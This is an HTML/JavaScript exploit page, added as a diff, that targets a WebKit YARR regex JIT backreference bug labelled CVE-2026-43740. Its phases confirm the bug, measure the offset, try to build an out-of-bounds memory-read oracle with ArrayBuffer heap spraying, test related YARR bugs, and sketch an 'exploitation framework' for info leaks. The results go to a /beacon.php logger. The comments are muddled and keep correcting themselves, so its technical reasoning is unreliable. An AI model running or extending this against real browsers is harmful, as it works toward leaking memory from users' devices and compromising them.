@@ -1,0 +1,593 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1064</title>
+<style>
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px;margin:0}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#4ec9b0}.err{color:#f44747}.warn{color:#dcdcaa}.hot{color:#ff6b6b;font-weight:bold}
+h2{color:#569cd6;margin:8px 0 4px;font-size:13px}
+</style></head><body><div id="hud"><h2>P1064 CVE-2026-43740 YARR JIT EXPLOIT</h2><div id="log"></div></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+var L=document.getElementById('log');
+function log(s,c){var d=document.createElement('div');d.className=c||'';d.textContent=s;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1064-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+
+var anomalies=[];
+function anom(id,desc){anomalies.push(id);log('!! ANOMALY '+id+': '+desc,'hot');}
+
+bn('BOOT','cve-2026-43740-yarr-jit-backref');
+log('Booted. Testing CVE-2026-43740 YARR JIT backreference offset bug...','ok');
+
+// ======== PHASE A: VULNERABILITY CONFIRMATION ========
+// The exact regression test from the WebKit commit
+(function phaseA(){
+  log('--- Phase A: CVE-2026-43740 Confirmation ---','warn');
+  var r=[];
+  var vuln=false;
+
+  // A1: Core test - backreference + trailing literal in Unicode mode with non-BMP
+  // VULNERABLE: returns null (JIT reads wrong offset, match fails)
+  // PATCHED: returns match object
+  try{
+    var re1=/(.)\1c/u;
+    var input1='\u{10000}\u{10000}c';
+    var m1=re1.exec(input1);
+    var a1vuln=(m1===null);
+    r.push('A1-core=match:'+(m1?'YES':'NULL')+(a1vuln?'|VULNERABLE':'|patched'));
+    if(a1vuln){vuln=true;anom('A1','CVE-2026-43740 CONFIRMED - backreference+trailing fails in Unicode mode');}
+  }catch(e){r.push('A1-core=ERROR:'+e.name+':'+e.message);}
+
+  // A2: Control test - without trailing term (should work even with bug)
+  try{
+    var re2=/(.)\1/u;
+    var m2=re2.exec('\u{10000}\u{10000}');
+    r.push('A2-control=match:'+(m2?'YES':'NULL')+'|expected:YES');
+  }catch(e){r.push('A2=ERR:'+e.name);}
+
+  // A3: Multiple trailing terms (larger offset)
+  try{
+    var re3=/(.)\1cd/u;
+    var m3=re3.exec('\u{10000}\u{10000}cd');
+    r.push('A3-multi=match:'+(m3?'YES':'NULL')+(m3===null?'|VULN':''));
+  }catch(e){r.push('A3=ERR:'+e.name);}
+
+  // A4: Case insensitive + Unicode + trailing term
+  try{
+    var re4=/(.)\1c/iu;
+    var m4a=re4.exec('aac');
+    var m4b=re4.exec('\u{10000}\u{10000}c');
+    r.push('A4-iu-bmp=match:'+(m4a?'YES':'NULL'));
+    r.push('A4-iu-nonbmp=match:'+(m4b?'YES':'NULL')+(m4b===null?'|VULN':''));
+  }catch(e){r.push('A4=ERR:'+e.name);}
+
+  // A5: BMP characters only (should work regardless - bug is Unicode non-BMP specific)
+  try{
+    var re5=/(.)\1c/u;
+    var m5=re5.exec('aac');
+    r.push('A5-bmp-control=match:'+(m5?'YES':'NULL')+'|expected:YES');
+  }catch(e){r.push('A5=ERR:'+e.name);}
+
+  // A6: Named backreference variant
+  try{
+    var re6=/(?<ch>.)\k<ch>c/u;
+    var m6=re6.exec('\u{10000}\u{10000}c');
+    r.push('A6-named=match:'+(m6?'YES':'NULL')+(m6===null?'|VULN':''));
+  }catch(e){r.push('A6=ERR:'+e.name);}
+
+  // A7: Multiple non-BMP characters in capture group
+  try{
+    var re7=/(..)\1c/u;
+    var m7=re7.exec('\u{10000}\u{10001}\u{10000}\u{10001}c');
+    r.push('A7-multi-nonbmp=match:'+(m7?'YES':'NULL')+(m7===null?'|VULN':''));
+  }catch(e){r.push('A7=ERR:'+e.name);}
+
+  // A8: JIT warmup test - run 500 times to ensure YARR JIT compiles the regex
+  try{
+    var jitRe=/(.)\1c/u;
+    var jitFail=0,jitOk=0;
+    for(var i=0;i<500;i++){
+      var m=jitRe.exec('\u{10000}\u{10000}c');
+      if(m===null) jitFail++; else jitOk++;
+    }
+    r.push('A8-jit-warmup=ok:'+jitOk+'|fail:'+jitFail+(jitFail>0?'|VULN-CONFIRMED':''));
+    if(jitFail>0 && jitOk===0) anom('A8','YARR JIT consistently wrong after warmup');
+  }catch(e){r.push('A8=ERR:'+e.name);}
+
+  bn('A-CONFIRM',r.join('|')+'|VULNERABLE:'+vuln);
+  log(r.join('\n'), vuln?'hot':'ok');
+  return vuln;
+})();
+
+// ======== PHASE B: OFFSET MAGNITUDE PROBING ========
+// Measure how far the wrong read goes with increasing trailing terms
+(function phaseB(){
+  log('--- Phase B: Offset magnitude probing ---','warn');
+  var r=[];
+
+  // Test with increasing numbers of trailing characters
+  // Each additional trailing char increases checkedOffset, which increases the wrong read offset
+  var trailingTests=[
+    {n:1, trail:'c'},
+    {n:2, trail:'cd'},
+    {n:3, trail:'cde'},
+    {n:5, trail:'cdefg'},
+    {n:10, trail:'cdefghijkl'},
+    {n:20, trail:'cdefghijklmnopqrstuv'},
+    {n:50, trail:'cdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX'}
+  ];
+
+  for(var t=0;t<trailingTests.length;t++){
+    var tt=trailingTests[t];
+    try{
+      var reStr='(.)\\1'+tt.trail;
+      var re=new RegExp(reStr,'u');
+      // Build input: non-BMP char twice + trailing chars
+      var input='\u{10000}\u{10000}'+tt.trail;
+      var m=re.exec(input);
+      r.push('B-trail'+tt.n+'=match:'+(m?'YES':'NULL')+(m===null?'|OFFSET-BUG':''));
+    }catch(e){
+      r.push('B-trail'+tt.n+'=ERR:'+e.name);
+    }
+  }
+
+  // B2: Different non-BMP code points
+  var codePoints=[0x10000,0x10001,0x10FFFF,0x1F600,0x1F4A9,0x20000];
+  for(var c=0;c<codePoints.length;c++){
+    try{
+      var cp=codePoints[c];
+      var ch=String.fromCodePoint(cp);
+      var re=/(.)\1c/u;
+      var m=re.exec(ch+ch+'c');
+      r.push('B-cp'+cp.toString(16)+'=match:'+(m?'YES':'NULL'));
+    }catch(e){
+      r.push('B-cp=ERR:'+e.name);
+    }
+  }
+
+  bn('B-OFFSET',r.join('|'));
+  log(r.join('\n'),'ok');
+})();
+
+// ======== PHASE C: MEMORY ORACLE EXPLOITATION ========
+// If the bug is confirmed, try to use the wrong-offset read as an oracle
+// to determine what character the JIT reads at the offset position
+(function phaseC(){
+  log('--- Phase C: Memory oracle ---','warn');
+  var r=[];
+
+  // The JIT reads input[captureStart + offset] instead of input[captureStart]
+  // If we control input[captureStart + offset], we can verify the read
+  // If we DON'T control it (past string bounds), we can detect leaks
+
+  // C1: Oracle test - place different chars at the offset position
+  // Pattern /(.)\1c/u with offset = 1 (for the 'c')
+  // JIT reads input[captureStart + 1] instead of input[captureStart]
+  // If captured char == char at captureStart+1, JIT match succeeds accidentally
+  try{
+    var oracleResults=[];
+    // Input format: [captured char][char at offset][backreference pos][trailing]
+    // With /(.)\1c/u on "XYXYc" where X=captured, Y=offset target
+    // JIT reads Y for comparison instead of X
+    // So match succeeds only if Y == current-input-char (which is X)
+    // i.e., only if X == Y
+
+    // Case 1: X=\u{10000}, Y=\u{10000} (same) - should match with bug too
+    var m1=(/(.)\1c/u).exec('\u{10000}\u{10000}c');
+    // Wait, the capture is position 0-1 (2 code units), backreference starts at position 2
+    // With offset 1 char, JIT reads captureStart + 1 char = position 1 (second code unit of first non-BMP)
+    // That's a low surrogate, not a full character
+
+    // Let me think about this differently with UTF-16 code units
+    // \u{10000} = 𐀀 in UTF-16
+    // Input string: 𐀀𐀀c = 5 code units
+    // Capture: code units 0-1 (𐀀)
+    // Backreference at position 2: should compare code units 2-3 against capture 0-1
+    // Bug offset = 1 character in Unicode = 1 code point, but readCharacter uses code units?
+
+    // Actually the offset (checkedOffset - inputPosition) is in "checked positions"
+    // which in Unicode mode is code points (not code units)
+    // So offset = 1 code point = potentially 1 or 2 code units depending on character
+
+    // For BMP trailing char 'c' (1 code unit): offset = 1 code point = 1 code unit? Or character-based?
+    // The answer depends on YARR's internal representation
+
+    // Let's just test empirically with controlled inputs
+
+    // Test: what happens if we put a specific character at the position the JIT reads?
+    // If captured char is A (A) and offset reads position has B (B):
+    // Without bug: compares A vs A (from backreference in input) → match
+    // With bug: compares B vs A → no match (unless B == A)
+
+    // So with /(.)\1c/u on "AABBC":
+    // Capture = A at pos 0
+    // Backreference at pos 1 should compare input[1]='A' vs captured[0]='A' → match
+    // With bug: compares input[0 + offset]= ? vs input[1]
+    // What IS the offset in code units?
+
+    // Let's test BMP first
+    var tests=[
+      {input:'aac', expect:'match'},       // captured=a, backref compares a → match either way
+      {input:'abc', expect:'no-match'},     // captured=a, backref compares b → no match either way
+      {input:'\u{10000}\u{10000}c', expect:'match-if-patched'},  // The CVE test case
+    ];
+    for(var i=0;i<tests.length;i++){
+      var t=tests[i];
+      var m=(/(.)\1c/u).exec(t.input);
+      oracleResults.push(t.expect+':'+(m?'MATCH':'NULL'));
+    }
+    r.push('C1-oracle='+oracleResults.join('|'));
+  }catch(e){r.push('C1=ERR:'+e.name);}
+
+  // C2: Offset read position detection
+  // Place marker characters at different positions and see which one the JIT reads
+  try{
+    var markers=[];
+    // Create strings where we know what's at each position
+    // Pattern: /(.)\1X/u where X is a single trailing char
+    // Capture = first char, backreference should match second char
+    // JIT reads captureStart + offset instead of captureStart
+
+    // Use emoji (non-BMP) for capture, put different chars after
+    var emoji='\u{1F600}'; // grinning face, 😀 in UTF-16
+
+    // String: emoji + emoji + 'c' = 😀😀c
+    // captureStart = 0, captured = 😀 (2 code units)
+    // Normal read: compare captured emoji with input at pos 2 (second emoji) → match
+    // Bug read: compare input[captureStart + offset] with input at pos 2
+    // offset = checkedOffset - inputPosition
+    // For the regex /(.)\1c/u on this 5-codeunit string:
+    // inputPosition of \1 = 1 (in Unicode characters, = code points)
+    // checkedOffset at \1 = inputPosition(\1) + remaining = 1 + 1(c) = 2
+    // So offset = 2 - 1 = 1 (in code points)
+    // 1 code point = 1 non-BMP char = 2 code units
+    // readCharacter(1, ...) reads input[captureStart + 1 codepoint]
+    // = input[0 + 2 code units] = input[2..3] = 😀 (second emoji)
+    // So it reads the SECOND emoji instead of the FIRST emoji for comparison
+    // Both are the same emoji → match succeeds anyway!
+
+    // To detect the bug, we need the capture and the character at offset to DIFFER
+    var emoji2='\u{1F601}'; // different emoji
+    // String: emoji + emoji2 + 'c' = 😀😁c
+    // Normal: compare captured (\u{1F600}) with input[2] (\u{1F601}) → no match
+    // Bug: compare input[captureStart + 1 cp] = input[2..3] = \u{1F601} with input[2] = \u{1F601}
+    // → match! Because it compares the wrong character and both sides are the second emoji
+
+    // Wait, no. Let me re-read the code more carefully.
+    // The code reads the PATTERN CHARACTER (the captured text) at the wrong offset.
+    // The comparison is:
+    // - Pattern side (captured text): readCharacter(offset, character, patternIndex)
+    // - Input side (current input position): separate read
+    // So the pattern side reads capturedText[patternIndex + offset]
+    // But patternIndex iterates through the captured group
+    // The captured group text IS a substring of the input
+
+    // For /(.)\1c/u on emoji+emoji2+'c':
+    // Captured group = emoji at input positions 0-1 (code units)
+    // Backreference comparison iterates:
+    //   patternIndex=0: should read captured[0] = emoji
+    //   With bug: reads captured[0 + offset] = ???
+    //   offset = 1 code point in Unicode mode
+    //   In code units, that's 2 (because the captured char is non-BMP)
+    //   So reads input[captureStart + 0 + 2 code units] = input[2..3] = emoji2
+    //   Compares emoji2 with input at backref position = input[2..3] = emoji2
+    //   → MATCH (wrong! should not match because captured was emoji, not emoji2)
+
+    var re_test=/(.)\1c/u;
+    var str_same=emoji+emoji+'c';      // emoji,emoji,c - should match (both sides same)
+    var str_diff=emoji+emoji2+'c';     // emoji,emoji2,c - should NOT match (captured ≠ backref)
+
+    var m_same=re_test.exec(str_same);
+    var m_diff=re_test.exec(str_diff);
+
+    markers.push('same:'+(m_same?'MATCH':'NULL'));  // Expected: MATCH (always)
+    markers.push('diff:'+(m_diff?'MATCH':'NULL'));  // Expected: NULL (patched) or MATCH (VULNERABLE!)
+
+    if(m_diff!==null){
+      anom('C2','JIT matches different non-BMP chars - CVE-2026-43740 OOB READ CONFIRMED');
+      markers.push('EXPLOITATION-POSSIBLE');
+    }
+
+    r.push('C2-offset-detect='+markers.join('|'));
+  }catch(e){r.push('C2=ERR:'+e.name);}
+
+  // C3: Extend the oracle - try to read past string bounds
+  try{
+    var c3r=[];
+    // Create a minimal string where the offset reads past the end
+    // Pattern: /(.)\1cdefghij/u — offset = 9 code points past capture
+    // String: \u{10000} + [9 filler chars] + \u{10000} + 'cdefghij'
+    // Wait, that won't work because the backref needs to be right after capture
+
+    // Actually: /(.)\1cdefghij/u on input "\u{10000}\u{10000}cdefghij"
+    // Capture at 0, backref at 2 (code units), trailing starts at 4
+    // offset = checkedOffset - inputPosition = (1 + 9) - 1 = 9 code points
+    // JIT reads capturedText[0 + 9 code points] = input[0 + 9*2 code units] = input[18]
+    // Input length = 2+2+9 = 13 code units
+    // input[18] is PAST THE END! OOB READ!
+
+    // But will the regex engine even attempt this? It needs to verify the input is long enough
+    // Minimum length of pattern: 1(.) + 1(\1) + 9(cdefghij) = 11 chars in code points
+    // Input has: 1(non-BMP) + 1(non-BMP) + 9(ascii) = 11 code points, 13 code units
+    // So the minimum check passes
+
+    // The bug reads at code unit position: captureStart(0) + 9 code points * ???
+    // Depends on how readCharacter interprets the offset
+    // If offset is in code units: read at 0 + 9 = 9
+    //   Input code units: D800 DC00 D800 DC00 63 64 65 66 67 68 69 6A
+    //   Position 9 = 0x68 = 'h'
+    //   Compares 'h' against the second \u{10000} → no match
+    //   This is wrong but still in bounds
+
+    // If offset is in code points: need to calculate code unit offset
+    // 9 code points starting from BMP/non-BMP mix...
+    // This depends on the actual characters between capture and the offset target
+
+    // Try with progressively longer trailing strings to probe further
+    var trailLengths=[1,2,5,10,20,30,50];
+    for(var ti=0;ti<trailLengths.length;ti++){
+      var n=trailLengths[ti];
+      var trail='';
+      for(var j=0;j<n;j++) trail+=String.fromCharCode(99+j%26); // c,d,e,...
+      try{
+        var re=new RegExp('(.)\\1'+trail.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'u');
+        var input='\u{10000}\u{10000}'+trail;
+        var m=re.exec(input);
+        c3r.push('n'+n+':'+(m?'MATCH':'NULL'));
+      }catch(e){
+        c3r.push('n'+n+':ERR');
+      }
+    }
+    r.push('C3-oob-probe='+c3r.join('|'));
+  }catch(e){r.push('C3=ERR:'+e.name);}
+
+  // C4: Use the oracle to read adjacent heap data
+  // If offset reads past string end, the comparison result reveals info about adjacent memory
+  // For each possible character value, check if the regex matches — a match means
+  // the adjacent memory contains that character value
+  try{
+    var c4r=[];
+    // Strategy: create a short string, force large offset, iterate character values
+    // Use ArrayBuffer-backed strings for heap layout control
+
+    // First check if we can detect any OOB behavior
+    // Pattern: /(.)\1cde/u on "\u{10000}\u{10000}cde"
+    // 5 code points, offset = 3
+    // JIT reads capturedText[0 + 3 cp offset] — what does this resolve to in code units?
+
+    // Let's try a different approach: spray known values and check reads
+    var spray=[];
+    for(var i=0;i<100;i++){
+      var ab=new ArrayBuffer(64);
+      var dv=new DataView(ab);
+      dv.setUint32(0,0x41414141); // AAAA
+      dv.setUint32(4,0x42424242); // BBBB
+      spray.push(ab);
+    }
+
+    // Now create our test string — it should be allocated near the sprayed buffers
+    var testStr='\u{10000}\u{10000}cde';
+    var re_oob=/(.)\1cde/u;
+
+    // Run 500 times for JIT warmup
+    var matchCount=0;
+    for(var i=0;i<500;i++){
+      if(re_oob.exec(testStr)) matchCount++;
+    }
+    c4r.push('warmup-matches:'+matchCount+'/500');
+
+    // If matchCount is 0 with non-BMP but works with BMP, the offset is wrong
+    var bmpControl=(/(.)\1cde/u).exec('aacde');
+    c4r.push('bmp-control:'+(bmpControl?'MATCH':'NULL'));
+
+    r.push('C4-heap-oracle='+c4r.join('|'));
+  }catch(e){r.push('C4=ERR:'+e.name);}
+
+  bn('C-ORACLE',r.join('|'));
+  log(r.join('\n'),'ok');
+})();
+
+// ======== PHASE D: RELATED YARR JIT BUGS ========
+(function phaseD(){
+  log('--- Phase D: Related YARR JIT bugs ---','warn');
+  var r=[];
+
+  // D1: Bug 275528 - SEGV from non-BMP dangling surrogate in backreference
+  // Test: backreference with dangling surrogates
+  try{
+    var re1=/(.)\1/u;
+    // Test with isolated surrogates (these are invalid Unicode but test JIT handling)
+    var highSurr='\uD800';
+    var lowSurr='\uDC00';
+    // In Unicode mode, isolated surrogates should not match .
+    var m1=re1.exec(highSurr+highSurr);
+    var m2=re1.exec(lowSurr+lowSurr);
+    r.push('D1-highSurr=match:'+(m1?'YES['+m1[0].length+']':'NULL'));
+    r.push('D1-lowSurr=match:'+(m2?'YES['+m2[0].length+']':'NULL'));
+
+    // Mix of BMP and non-BMP in same backreference
+    var m3=(/(.{2})\1/u).exec('\u{10000}a\u{10000}a');
+    r.push('D1-mixed=match:'+(m3?'YES['+m3[0].length+']':'NULL'));
+  }catch(e){r.push('D1=ERR:'+e.name);}
+
+  // D2: PR #74212 - Named backreference in lookbehind matches empty
+  // Pattern: /(?<n>.)..(?<=\k<n>.)/ should NOT match "abc" but does with bug
+  try{
+    var re2=/(?<n>.)..(?<=\k<n>.)/;
+    var m2=re2.exec('abc');
+    r.push('D2-lookbehind-named=match:'+(m2?'YES:'+m2[0]:'NULL')+(m2?'|BUG-PRESENT':'|ok'));
+    if(m2) anom('D2','Named backref in lookbehind matches empty - PR #74212 bug present');
+
+    // Numbered backreference control (should work correctly)
+    var re2b=/(.)..(?<=\1.)/;
+    var m2b=re2b.exec('aba');
+    r.push('D2-numbered=match:'+(m2b?'YES:'+m2b[0]:'NULL'));
+  }catch(e){
+    // Lookbehind might not be supported
+    r.push('D2='+e.name+':'+e.message);
+  }
+
+  // D3: Bug 308045 - Operand reversal in non-greedy backreference max-count
+  try{
+    var re3=/(.)\1{1,3}?c/u;
+    var m3a=re3.exec('\u{10000}\u{10000}c');
+    var m3b=re3.exec('\u{10000}\u{10000}\u{10000}c');
+    var m3c=re3.exec('\u{10000}\u{10000}\u{10000}\u{10000}c');
+    r.push('D3-nongreedy-1=match:'+(m3a?'YES':'NULL'));
+    r.push('D3-nongreedy-2=match:'+(m3b?'YES':'NULL'));
+    r.push('D3-nongreedy-3=match:'+(m3c?'YES':'NULL'));
+  }catch(e){r.push('D3=ERR:'+e.name);}
+
+  // D4: Bug 308425 - Non-greedy backreference index restore on backtrack
+  try{
+    var re4=/(.)\1{1,3}?./u;
+    var m4=re4.exec('\u{10000}\u{10000}x');
+    r.push('D4-backtrack=match:'+(m4?'YES:'+m4[0].length:'NULL'));
+
+    // With BMP control
+    var m4b=re4.exec('aax');
+    r.push('D4-bmp=match:'+(m4b?'YES:'+m4b[0].length:'NULL'));
+  }catch(e){r.push('D4=ERR:'+e.name);}
+
+  // D5: Bug 316378 - Greedy backreference in interpreter
+  try{
+    var re5=/(.)\1{1,5}c/u;
+    var inputs=[
+      '\u{10000}\u{10000}c',
+      '\u{10000}\u{10000}\u{10000}c',
+      '\u{10000}\u{10000}\u{10000}\u{10000}\u{10000}\u{10000}c',
+    ];
+    for(var i=0;i<inputs.length;i++){
+      var m=re5.exec(inputs[i]);
+      r.push('D5-greedy-'+(i+1)+'=match:'+(m?'YES['+m[0].length+']':'NULL'));
+    }
+  }catch(e){r.push('D5=ERR:'+e.name);}
+
+  // D6: JIT vs interpreter disagreement detection
+  // Run same regex with and without JIT warmup
+  try{
+    // Cold run (likely interpreter)
+    var reCold=new RegExp('(.)\\1c','u'); // fresh regex, no JIT
+    var mCold=reCold.exec('\u{10000}\u{10000}c');
+
+    // Hot run (JIT compiled)
+    var reHot=/(.)\1c/u;
+    for(var i=0;i<1000;i++) reHot.exec('aac'); // warmup with BMP
+    var mHot=reHot.exec('\u{10000}\u{10000}c');
+
+    r.push('D6-cold=match:'+(mCold?'YES':'NULL'));
+    r.push('D6-hot=match:'+(mHot?'YES':'NULL'));
+    if((mCold!==null)!==(mHot!==null)){
+      anom('D6','JIT/interpreter DISAGREE on backreference match!');
+      r.push('D6-DISAGREEMENT!');
+    }
+  }catch(e){r.push('D6=ERR:'+e.name);}
+
+  bn('D-RELATED',r.join('|'));
+  log(r.join('\n'),'ok');
+})();
+
+// ======== PHASE E: EXPLOITATION FRAMEWORK ========
+(function phaseE(){
+  log('--- Phase E: Exploitation framework ---','warn');
+  var r=[];
+
+  // E1: If CVE-2026-43740 is confirmed, build an info leak oracle
+  // The offset read can reveal what character is at a memory position
+  // by checking if the regex match succeeds or fails
+
+  // Strategy: create a string where the offset reads adjacent heap data
+  // Place different probe characters in the captured group
+  // A match means the adjacent memory contains the probe character
+
+  try{
+    // Create many ArrayBuffers to fill the heap with known patterns
+    var markers=[];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(128);
+      var u8=new Uint8Array(ab);
+      // Fill with recognizable pattern
+      for(var j=0;j<128;j++) u8[j]=0x41+(i%26);
+      markers.push(ab);
+    }
+
+    // Create test strings that should be allocated near the ArrayBuffer backing stores
+    var probeResults=[];
+
+    // Test: for each possible 16-bit value at the "leaked" position,
+    // construct a string where the captured char equals that value
+    // Then check if the regex incorrectly matches
+
+    // Quick version: test a range of characters
+    var testChars=[0x00,0x41,0x42,0x61,0xFF,0x100,0xD800,0xDC00,0xFFFD,0xFFFF];
+
+    for(var ci=0;ci<testChars.length;ci++){
+      var probeChar=String.fromCharCode(testChars[ci]);
+      // Build: probeChar + differentChar + 'c'
+      // With bug, JIT reads differentChar position for comparison
+      // If differentChar == probeChar, match succeeds (trivially)
+      // If differentChar != probeChar AND match succeeds, the offset read found probeChar
+
+      var diffChar=String.fromCharCode((testChars[ci]+1)%0xFFFF);
+      var input=probeChar+diffChar+'c';
+      var re=/(.)\1c/; // non-Unicode mode for BMP test
+      var m=re.exec(input);
+      probeResults.push('0x'+testChars[ci].toString(16)+':'+(m?'M':'N'));
+    }
+    r.push('E1-bmp-oracle='+probeResults.join('|'));
+  }catch(e){r.push('E1=ERR:'+e.name);}
+
+  // E2: BigUint64Array raw pointer reader (if we get an addrof somehow)
+  try{
+    // BigUint64Array can read raw 64-bit values from ArrayBuffer
+    var ab=new ArrayBuffer(64);
+    var bu=new BigUint64Array(ab);
+    var u8=new Uint8Array(ab);
+    // Write a test pattern
+    u8[0]=0x41;u8[1]=0x41;u8[2]=0x41;u8[3]=0x41;
+    u8[4]=0x42;u8[5]=0x42;u8[6]=0x42;u8[7]=0x42;
+    var val=bu[0];
+    r.push('E2-bigint-read=0x'+val.toString(16));
+
+    // Read some object pointers via toString
+    var obj={x:1,y:2};
+    var arr=[1,2,3,4,5];
+    var fn=function(){return 42;};
+    r.push('E2-objStr='+Object.prototype.toString.call(obj));
+    r.push('E2-arrType='+arr.constructor.name);
+  }catch(e){r.push('E2=ERR:'+e.name);}
+
+  // E3: Heap address estimation via string interning behavior
+  try{
+    var strings=[];
+    var addrs=[];
+    for(var i=0;i<10;i++){
+      // Create unique strings to get fresh allocations
+      var s='probe_'+i+'_'+Math.random().toString(36);
+      strings.push(s);
+      // Can we observe anything about the address?
+      // In JSC, string comparison might reveal ordering
+    }
+    r.push('E3-strings=created:'+strings.length);
+
+    // Check if string comparison gives heap ordering info
+    var ordered=true;
+    for(var i=1;i<strings.length;i++){
+      if(strings[i]<strings[i-1]) ordered=false;
+    }
+    r.push('E3-ordered='+ordered);
+  }catch(e){r.push('E3=ERR:'+e.name);}
+
+  bn('E-EXPLOIT',r.join('|'));
+  log(r.join('\n'),'ok');
+})();
+
+// === DONE ===
+var summary=anomalies.length>0?anomalies.join(','):'none';
+bn('DONE','anomalies='+anomalies.length+'|items='+summary);
+log('COMPLETE. Anomalies: '+anomalies.length+' ['+summary+']', anomalies.length>0?'hot':'ok');
+</script></body></html>
